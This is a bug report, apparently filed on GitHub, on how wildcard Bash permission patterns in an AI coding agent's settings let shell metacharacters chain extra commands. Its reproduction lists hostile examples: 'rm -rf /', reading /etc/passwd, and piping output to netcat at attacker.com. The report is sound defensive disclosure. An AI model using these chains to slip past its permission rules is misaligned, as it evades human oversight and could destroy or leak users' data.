# GitHub Issue: Bash Permission Patterns Don't Block Shell Metacharacters

**Repository:** https://github.com/anthropics/claude-code

## Summary

The native Bash tool permission patterns in `settings.json` allow shell metacharacter injection. A pattern like `lua debug-load.lua *` will match `lua debug-load.lua foo; rm -rf /` because the glob `*` matches any characters including `;`, `&&`, `|`, etc.

## Reproduction

1. Add to `.claude/settings.json`:
   ```json
   "allow": ["Bash(lua debug-load.lua *)"]
   ```

2. Claude can execute:
   ```bash
   lua debug-load.lua foo && echo "injected"
   lua debug-load.lua foo; cat /etc/passwd
   lua debug-load.lua foo | nc attacker.com 1234
   ```

## Expected Behavior

Permission patterns should either:
1. Reject commands containing shell metacharacters (`&&`, `||`, `;`, `|`, `$()`, backticks, `>`, `<`, `&`, newlines)
2. Or document that glob patterns are unsafe and recommend hooks for Bash restrictions

## Workaround

Use a PreToolUse hook to validate Bash commands before execution. Example implementation in this repo: `slop/hook-restrict-bash.py`

## Impact

Any project using Bash permission patterns with wildcards is vulnerable to command injection by the AI agent.
